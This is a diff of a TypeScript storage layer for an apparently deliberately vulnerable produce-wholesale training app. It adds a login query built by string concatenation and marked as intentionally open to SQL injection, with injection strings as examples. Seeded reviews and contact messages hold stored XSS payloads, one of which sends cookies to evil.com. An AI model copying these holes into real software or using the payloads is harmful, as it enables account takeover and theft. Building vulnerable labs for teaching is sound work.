@@ -1,7 +1,7 @@
-import { 
-  type User, 
-  type InsertUser, 
-  type Product, 
+import {
+  type User,
+  type InsertUser,
+  type Product,
   type InsertProduct,
   type Order,
   type InsertOrder,
@@ -20,6 +20,7 @@ export interface IStorage {
   // Users
   getUser(id: string): Promise<User | undefined>;
   getUserByUsername(username: string): Promise<User | undefined>;
+  getUserByCredentials(username: string, password: string): Promise<User | undefined>;
   createUser(user: InsertUser): Promise<User>;
   updateUser(id: string, updates: Partial<User>): Promise<User | undefined>;
   getAllUsers(): Promise<User[]>;
@@ -364,7 +365,7 @@ export class MemStorage implements IStorage {
   ): string {
     const orderId = randomUUID();
     const orderNumber = `MFF-${this.orderCounter++}`;
-    const totalAmount = items.reduce((sum, item) => 
+    const totalAmount = items.reduce((sum, item) =>
       sum + (parseFloat(item.price) * item.quantity), 0
     ).toFixed(2);
 
@@ -408,10 +409,17 @@ export class MemStorage implements IStorage {
     );
   }
 
+  async getUserByCredentials(username: string, password: string): Promise<User | undefined> {
+    // MemStorage is safe by default as it doesn't use SQL
+    return Array.from(this.users.values()).find(
+      (user) => user.username === username && user.password === password
+    );
+  }
+
   async createUser(insertUser: InsertUser): Promise<User> {
     const id = randomUUID();
-    const user: User = { 
-      ...insertUser, 
+    const user: User = {
+      ...insertUser,
       id,
       role: "customer",
       companyName: insertUser.companyName || null,
@@ -447,8 +455,8 @@ export class MemStorage implements IStorage {
 
   async createProduct(insertProduct: InsertProduct): Promise<Product> {
     const id = randomUUID();
-    const product: Product = { 
-      ...insertProduct, 
+    const product: Product = {
+      ...insertProduct,
       id,
       description: insertProduct.description || null,
       imageUrl: insertProduct.imageUrl || null,
@@ -525,11 +533,11 @@ export class MemStorage implements IStorage {
 
   async createReview(insertReview: InsertReview): Promise<Review> {
     const id = randomUUID();
-    
+
     // Get username from user
     const user = await this.getUser(insertReview.userId);
     const username = user?.username || "Unknown";
-    
+
     const review: Review = {
       ...insertReview,
       id,
@@ -827,15 +835,15 @@ export class SQLiteStorage implements IStorage {
       VALUES (?, ?, ?, ?, ?, ?, ?)
     `);
 
-    insertReviewStmt.run(randomUUID(), productIds[0], customerIds[0], "thepubco", 5, 
+    insertReviewStmt.run(randomUUID(), productIds[0], customerIds[0], "thepubco", 5,
       "Excellent quality tomatoes, always fresh and vine-ripened. Our customers love them!", daysAgo(15));
-    
+
     insertReviewStmt.run(randomUUID(), productIds[10], customerIds[1], "bella_italia", 5,
       "Perfetto! The basil is always aromatic and fresh. Essential for our pasta dishes.", daysAgo(11));
-    
+
     insertReviewStmt.run(randomUUID(), productIds[1], customerIds[2], "green_leaf", 4,
       "Good quality organic spinach. Would prefer slightly larger bags though.", daysAgo(6));
-    
+
     insertReviewStmt.run(randomUUID(), productIds[12], customerIds[3], "royal_curry", 5,
       "Fresh coriander essential for authentic curries. Always top quality! <script>alert('review-xss')</script>", daysAgo(13));
 
@@ -847,10 +855,10 @@ export class SQLiteStorage implements IStorage {
 
     insertContactStmt.run(randomUUID(), "Tom Baker", "tom@newcafe.co.uk", "The New Café",
       "Hi, I'm opening a new café in Didsbury and would like to discuss wholesale pricing for fruit and vegetables. Could someone contact me?", daysAgo(4));
-    
+
     insertContactStmt.run(randomUUID(), "Lisa Morton", "lisa.morton@catering.com", "Morton Events",
       "We run corporate catering events and need a reliable supplier for fresh produce. Do you offer next-day delivery? <img src=x onerror=fetch('http://evil.com/?cookie='+document.cookie)>", daysAgo(2));
-    
+
     insertContactStmt.run(randomUUID(), "James Wilson", "james@wilsonrestaurants.co.uk", null,
       "Question about your organic certification. Do you have documentation I can review?", daysAgo(6));
   }
@@ -861,9 +869,33 @@ export class SQLiteStorage implements IStorage {
     // This allows SQL injection attacks like: ' OR '1'='1' --
     const query = `SELECT * FROM users WHERE username='${username}'`;
     const row = this.db.prepare(query).get() as any;
-    
+
     if (!row) return undefined;
-    
+
+    return {
+      id: row.id,
+      username: row.username,
+      password: row.password,
+      email: row.email,
+      companyName: row.company_name,
+      contactPerson: row.contact_person,
+      phone: row.phone,
+      address: row.address,
+      role: row.role,
+      bio: row.bio,
+    };
+  }
+
+  // VULNERABILITY: SQL Injection in login
+  async getUserByCredentials(username: string, password: string): Promise<User | undefined> {
+    // INTENTIONALLY VULNERABLE: String concatenation instead of parameterized query
+    // This allows SQL injection attacks like: ' OR '1'='1' --
+    const query = `SELECT * FROM users WHERE username='${username}' AND password='${password}'`;
+    console.log(`Executing SQL: ${query}`); // Log for debugging/educational purposes
+    const row = this.db.prepare(query).get() as any;
+
+    if (!row) return undefined;
+
     return {
       id: row.id,
       username: row.username,
@@ -884,7 +916,7 @@ export class SQLiteStorage implements IStorage {
     // Attack: '; DROP TABLE products--
     const sql = `SELECT * FROM products WHERE name LIKE '%${query}%' OR category LIKE '%${query}%'`;
     const rows = this.db.prepare(sql).all() as any[];
-    
+
     return rows.map(row => ({
       id: row.id,
       name: row.name,
@@ -901,7 +933,7 @@ export class SQLiteStorage implements IStorage {
   async getUser(id: string): Promise<User | undefined> {
     const row = this.db.prepare("SELECT * FROM users WHERE id = ?").get(id) as any;
     if (!row) return undefined;
-    
+
     return {
       id: row.id,
       username: row.username,
@@ -932,7 +964,7 @@ export class SQLiteStorage implements IStorage {
       insertUser.address || null,
       insertUser.bio || null
     );
-    
+
     return (await this.getUser(id))!;
   }
 
@@ -941,7 +973,7 @@ export class SQLiteStorage implements IStorage {
     if (!user) return undefined;
 
     const updatedUser = { ...user, ...updates };
-    
+
     this.db.prepare(`
       UPDATE users SET 
         username = ?, password = ?, email = ?, company_name = ?,
@@ -996,7 +1028,7 @@ export class SQLiteStorage implements IStorage {
   async getProduct(id: string): Promise<Product | undefined> {
     const row = this.db.prepare("SELECT * FROM products WHERE id = ?").get(id) as any;
     if (!row) return undefined;
-    
+
     return {
       id: row.id,
       name: row.name,
